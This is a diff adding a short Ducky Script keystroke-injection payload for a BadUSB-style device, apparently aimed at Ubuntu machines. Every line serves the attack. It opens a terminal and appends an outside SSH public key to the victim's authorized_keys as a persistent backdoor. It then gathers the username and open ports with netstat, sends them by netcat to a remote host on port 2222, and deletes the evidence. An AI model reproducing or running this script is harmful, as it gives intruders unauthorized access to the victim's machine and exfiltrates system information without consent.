@@ -1,0 +1,36 @@
+DELAY 50
+REM open terminal on ubuntu
+CTRL-ALT T
+DELAY 3000
+STRING echo 'malicious file' > .mal_file
+ENTER
+DELAY 500
+REM leave own public-key behind
+STRING echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMALxZXGG71ti7ubVLULGY7y45ZLqiGSG83l3vX+LWvINUKb5AX8yGBPrEYeYA0hMiRl+wwspmrta7w2ZX2K/LGH9NR8FH5uUDOzAaeV/IWk72Gs2HMUcaUrJLpJ3FshEOT3IqjVOxFrlrb7riawpdfFXyEXp/CNAe+wODgn4IlqOXfd9+INA8F/pYprPol3Xq1o3QkCz6Ey7ORE/WHcdh12OboY0HInKfIYSfmqQnRoCZJgjEsTh+8IagclUR03KM5xEQ78ntdO9KQ+BEC2QCvDi85pzJ+DPCybqH6HwUIahyEVA5fxdLevPToFPFSSM2RQ7vF0jiWFlLnoEB93iL yanice@yanices-MacBook-Pro.local" >> ~/.ssh/authorized_keys
+ENTER
+DELAY 50
+REM create info file
+STRING echo "USER: " >> info.txt
+ENTER
+DELAY 50
+REM name user
+STRING echo $USER >> info.txt
+ENTER
+DELAY 50
+STRING echo "PORT info: " >> info.txt
+ENTER
+DELAY 50
+REM list ports into info
+STRING netstat -ntlpu >> info.txt
+ENTER
+DELAY 50
+REM send file to own computer 
+STRING netcat -w 3 192.168.1.102 2222 < info.txt
+ENTER
+DELAY 4000
+REM remove info file
+STRING rm info.txt
+ENTER
+DELAY 50
+STRING exit
+ENTER
